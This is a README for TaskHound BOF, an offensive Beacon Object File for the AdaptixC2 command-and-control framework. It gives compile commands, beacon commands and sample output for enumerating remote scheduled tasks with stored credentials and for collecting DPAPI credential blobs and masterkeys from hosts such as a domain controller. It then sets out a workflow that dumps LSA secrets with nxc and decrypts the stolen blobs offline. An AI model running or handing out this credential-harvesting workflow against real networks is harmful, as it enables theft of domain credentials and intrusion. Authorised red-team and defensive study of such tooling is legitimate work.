# TaskHound BOF (Beacon Object File)

> **EXPERIMENTAL WARNING**  
> This BOF is **UNSAFE** for production environments. Limited testing has been done in lab environments. Don't blame me if it blows up your op or gets you busted. You have been warned.

## Overview

The BOF provides **initial data collection** capabilities directly from your C2 beacon, including:
- Scheduled task XML enumeration and parsing
- DPAPI credential blob collection
- DPAPI masterkey collection for offline decryption

For comprehensive analysis with high-value detection and live DPAPI decryption, use the collected files with the main Python tool's `--offline` mode.

## Compilation

### Quick Compilation
```bash
cd BOF/
./compile.sh
```

### Manual Compilation
**Requirements:** MinGW-w64 cross-compiler for Windows PE object files

```bash
# Install MinGW-w64 (macOS example)
brew install mingw-w64

# Compile manually
cd BOF/AdaptixC2/
x86_64-w64-mingw32-gcc -c taskhound.c -o taskhound.o \
  -fno-stack-check -fno-stack-protector -mno-stack-arg-probe \
  -fno-asynchronous-unwind-tables -fno-builtin -Os
```

## Usage

### Basic Commands
```bash
# Current user context (uses beacon's authentication)
# Note: If using the current logon session, always prefer HOSTNAME over IP to avoid NTLM fallback!
beacon > taskhound HOSTNAME/IP

# With explicit credentials  
beacon > taskhound HOSTNAME/IP -u thesimpsons\homer.simpson -p P@ssw0rd

# With credential saving for offline analysis
beacon > taskhound HOSTNAME/IP -u username -p password -save C:\temp\task_collection

# Show all tasks including those without stored credentials
beacon > taskhound HOSTNAME/IP -unsaved-creds

# Collect DPAPI credential blobs and masterkeys (requires -save)
beacon > taskhound HOSTNAME/IP -u username -p password -save C:\temp\task_collection -grab-blobs
```

### Command Flags
- `-u username` - Username for authentication (domain\user format)
- `-p password` - Password for authentication
- `-save directory` - Save XML files and DPAPI files to directory
- `-unsaved-creds` - Show tasks without stored credentials
- `-grab-blobs` - Collect DPAPI credential blobs and masterkeys (requires `-save`)

> **Note**: The `-grab-blobs` flag collects the raw DPAPI files needed for offline credential extraction. Use the main Python tool with `--dpapi-key` to decrypt them.

## Example Output

### Basic Task Collection
```
beacon > taskhound DC -u highpriv -p P@ssw0rd1337. -save C:\Temp\test

[22/09 23:14:01] [*] Task: execute BOF
[22/09 23:14:01] [*] Agent called server, sent [9.81 Kb]
[+] TaskHound - Remote Task Collection
[+] Target: DC
[+] Using credentials: highpriv
[+] Save directory: C:\Temp\test
[+] Saved: C:\Temp\test\DC\Windows\System32\Tasks\Test1
Test1: THESIMPSONS\Administrator is executing C:\Windows\System32\AcXtrnal.dll 1234 [STORED CREDS]
[+] Saved: C:\Temp\test\DC\Windows\System32\Tasks\Test2
Test2: THESIMPSONS\lowpriv is executing C:\Windows\System32\AboveLockAppHost.dll 123432 [STORED CREDS]
[+] Collection complete. Found 2 tasks
[22/09 23:14:01] [+] BOF finished
```

### With DPAPI Collection
```
beacon > taskhound DC -u highpriv -p P@ssw0rd1337. -save C:\Temp\test -grab-blobs

[22/09 23:14:01] [*] Task: execute BOF
[+] TaskHound - Remote Task Collection
[+] Target: DC
[+] Using credentials: highpriv
[+] Save directory: C:\Temp\test
[+] Will collect credential blobs and masterkeys
[+] Saved: C:\Temp\test\DC\Windows\System32\Tasks\Test1
Test1: THESIMPSONS\Administrator is executing C:\Windows\System32\AcXtrnal.dll 1234 [STORED CREDS]
[+] Saved: C:\Temp\test\DC\Windows\System32\Tasks\Test2
Test2: THESIMPSONS\lowpriv is executing C:\Windows\System32\AboveLockAppHost.dll 123432 [STORED CREDS]

[*] Collecting DPAPI files...
[+] Saved credential blob: C:\Temp\test\DC\dpapi_loot\credentials\{guid}
[+] Saved credential blob: C:\Temp\test\DC\dpapi_loot\credentials\{guid}
[+] Saved masterkey: C:\Temp\test\DC\dpapi_loot\masterkeys\{guid}
[+] DPAPI collection complete: 2 credential blobs, 1 masterkeys
[+] Collection complete. Found 2 tasks, 2 credential blobs, 1 masterkeys
[22/09 23:14:01] [+] BOF finished
```

## Directory Structure

When using `-save`, creates Python TaskHound compatible structure:

```
save_directory/
└── hostname/
    ├── Windows/
    │   └── System32/
    │       └── Tasks/
    │           ├── Test1
    │           ├── Test2
    │           └── ...
    └── dpapi_loot/              # Only created with -grab-blobs
        ├── credentials/
        │   ├── {GUID-1}
        │   ├── {GUID-2}
        │   └── ...
        └── masterkeys/
            ├── {GUID-1}
            ├── {GUID-2}
            └── ...
```

## Offline Analysis Integration

BOF-collected files work seamlessly with Python TaskHound:

```bash
# After BOF collection with -save (transfer files to your analysis host)

# Basic offline analysis with BloodHound data
taskhound --offline /path/to/hostname/ --bh-data /path/to/bloodhound_export.json

# Offline analysis with DPAPI decryption (requires -grab-blobs collection)
# First, obtain the DPAPI_SYSTEM userkey via LSA dump:
nxc smb target -u user -p pass --lsa

# Then decrypt the collected DPAPI files:
taskhound --offline /path/to/hostname/ --dpapi-key 0x51e43225... --bh-data /path/to/bloodhound_export.json
```

### DPAPI Workflow

1. **Collection** (BOF): `taskhound target -u user -p pass -save C:\output -grab-blobs`
2. **Transfer**: Download `C:\output\hostname\` to your analysis machine
3. **LSA Dump**: `nxc smb target -u user -p pass --lsa` (get `dpapi_userkey`)
4. **Decryption**: `taskhound --offline hostname/ --dpapi-key 0x...`

This workflow allows you to collect DPAPI files through your beacon without exposing credentials in the C2 logs, then decrypt them offline on your analysis machine.

## Compatibility

Currently designed for **AdaptixC2**. Can probably be adapted for other C2 frameworks, but that's left as an exercise for the reader.
